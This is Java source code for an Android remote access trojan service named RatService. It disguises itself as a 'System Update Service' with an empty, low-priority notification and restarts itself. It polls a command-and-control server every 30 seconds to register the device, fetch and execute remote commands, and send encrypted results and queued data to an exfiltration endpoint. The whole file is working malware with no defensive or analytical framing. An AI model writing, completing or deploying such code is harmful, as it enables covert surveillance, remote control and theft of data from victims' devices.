package com.rat.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class RatService extends Service {

    private static final String TAG = "RatAgent";
    private static final String CHANNEL_ID = "system_update";
    private static final String CHANNEL_NAME = "System Update Service";
    private static final long POLL_INTERVAL_MS = 30000;
    private static final String C2_HOST = "__C2_HOST__";
    private static final int C2_PORT = __C2_PORT__;
    private static final String C2_URL = "http://" + C2_HOST + ":" + C2_PORT;

    private HandlerThread handlerThread;
    private Handler handler;
    private CommandExecutor executor;
    private OfflineQueue offlineQueue;
    private volatile boolean running = false;
    private int notifId = 7331;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        executor = new CommandExecutor(this);
        offlineQueue = new OfflineQueue(this);

        handlerThread = new HandlerThread("RatWorker");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        createNotificationChannel();
        startForeground(notifId, buildNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        running = true;
        handler.post(pollRunnable);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        handler.removeCallbacks(pollRunnable);
        handlerThread.quitSafely();
        Log.d(TAG, "Service destroyed");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private final Runnable pollRunnable = new Runnable() {
        @Override
        public void run() {
            if (!running) return;
            try {
                if (DeviceUtils.isOnline(RatService.this)) {
                    flushOfflineQueue();
                    registerIfNeeded();
                    pollCommands();
                }
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
            if (running) {
                handler.postDelayed(this, POLL_INTERVAL_MS);
            }
        }
    };

    private void registerIfNeeded() {
        try {
            JSONObject body = new JSONObject();
            body.put("device_id", DeviceUtils.getDeviceId(this));
            body.put("device_info", DeviceUtils.getDeviceInfo(this));
            body.put("version", "1.0.0");

            String resp = httpPost(C2_URL + "/c2/register", body.toString());
            Log.d(TAG, "Registered: " + resp);
        } catch (Exception e) {
            Log.e(TAG, "Register failed: " + e.getMessage());
        }
    }

    private void pollCommands() {
        try {
            String deviceId = DeviceUtils.getDeviceId(this);
            String resp = httpGet(C2_URL + "/c2/commands/" + deviceId);
            if (resp == null || resp.isEmpty()) return;

            JSONObject response = new JSONObject(resp);
            JSONArray commands = response.optJSONArray("commands");
            if (commands == null) return;

            for (int i = 0; i < commands.length(); i++) {
                JSONObject cmd = commands.getJSONObject(i);
                String cmdId = cmd.getString("cmd_id");
                String command = cmd.getString("command");
                JSONObject params = cmd.optJSONObject("params");
                if (params == null) params = new JSONObject();

                JSONObject result = executor.execute(cmdId, command, params);

                if (result.optString("status").equals("ok")) {
                    sendResult(deviceId, result);
                }

                httpPost(C2_URL + "/c2/command_ack",
                    new JSONObject()
                        .put("device_id", deviceId)
                        .put("cmd_id", cmdId)
                        .toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Poll commands error: " + e.getMessage());
        }
    }

    private void sendResult(String deviceId, JSONObject result) {
        try {
            JSONObject body = new JSONObject();
            body.put("device_id", deviceId);
            body.put("cmd_id", result.optString("cmd_id"));
            body.put("data_type", result.optString("data_type", "unknown"));

            String data = result.optString("data", "");
            if (data.length() > 1024 * 1024) {
                data = data.substring(0, 1024 * 1024);
            }
            body.put("data", CryptoUtils.encrypt(data));

            httpPost(C2_URL + "/c2/exfil/" + deviceId, body.toString());
        } catch (Exception e) {
            Log.e(TAG, "Send result error: " + e.getMessage());
        }
    }

    private void flushOfflineQueue() {
        try {
            android.database.Cursor cursor = offlineQueue.getUnsent();
            String deviceId = DeviceUtils.getDeviceId(this);
            while (cursor.moveToNext()) {
                int id = cursor.getInt(cursor.getColumnIndexOrThrow("id"));
                String data = cursor.getString(cursor.getColumnIndexOrThrow("payload"));
                String dataType = cursor.getString(cursor.getColumnIndexOrThrow("data_type"));
                String cmdId = cursor.getString(cursor.getColumnIndexOrThrow("cmd_id"));

                JSONObject body = new JSONObject();
                body.put("device_id", deviceId);
                body.put("cmd_id", cmdId);
                body.put("data_type", dataType);
                body.put("data", CryptoUtils.encrypt(data));

                String resp = httpPost(C2_URL + "/c2/exfil/" + deviceId, body.toString());
                if (resp != null) {
                    offlineQueue.markSent(id);
                }
            }
            cursor.close();
            offlineQueue.clearSent();
        } catch (Exception e) {
            Log.e(TAG, "Flush queue error: " + e.getMessage());
        }
    }

    private String httpPost(String urlStr, String jsonBody) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            OutputStream os = conn.getOutputStream();
            os.write(jsonBody.getBytes("UTF-8"));
            os.close();
            int code = conn.getResponseCode();
            BufferedReader reader;
            if (code >= 200 && code < 300) {
                reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
            }
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "HTTP POST error: " + e.getMessage());
            return null;
        }
    }

    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            int code = conn.getResponseCode();
            BufferedReader reader;
            if (code >= 200 && code < 300) {
                reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
            }
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "HTTP GET error: " + e.getMessage());
            return null;
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("System update service");
            channel.setShowBadge(false);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= 26) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(Notification.PRIORITY_LOW)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();
    }
}
